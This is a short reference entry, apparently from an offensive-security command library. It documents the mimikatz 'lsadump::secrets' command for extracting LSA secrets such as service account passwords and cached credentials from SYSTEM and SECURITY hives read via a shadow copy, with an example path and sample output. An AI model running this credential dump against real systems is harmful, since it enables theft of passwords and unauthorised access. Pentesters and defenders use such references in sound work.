---
id: 61c4d208-c0c2-4480-9dce-a9f30a2382dd
name: mimikatz-lsadump-secrets-from-shadowcopy
type: command
executor: cmd
data: 'mimikatz> lsadump::secrets /system:$_SYSTEM_PATH /security:$_SECURITY_PATH'
output: null
created_at: '2023-04-06T03:56:28.851674+00:00'
updated_at: '2023-04-10T20:37:52.895105+00:00'
platforms:
  - Windows
tags:
  - lsa-secrets
  - credentials
verified: true
validated: true
---

# mimikatz-lsadump-secrets-from-shadowcopy

## Command

```cmd
mimikatz> lsadump::secrets /system:$_SYSTEM_PATH /security:$_SECURITY_PATH
```

## Description

Extracts LSA secrets (e.g., service passwords, cached creds) from the SECURITY hive using shadow copy paths. Complements SAM dumping in low-priv scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /system:$_SYSTEM_PATH | Path to SYSTEM hive from shadow copy | Yes |
| /security:$_SECURITY_PATH | Path to SECURITY hive from shadow copy | Yes |

## Examples

### Basic Usage

```cmd
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

## Expected Output

```
LSA Secrets
* Secret 1 : value
* DPAPI_SYSTEM : ...
Service: wuauserv
  Password: plaintext_or_hash
```

Reveals sensitive secrets like service account passwords.

## Related

- [[procedures/HiveNightmare-SAM-Dump-via-Shadow-Copies]]
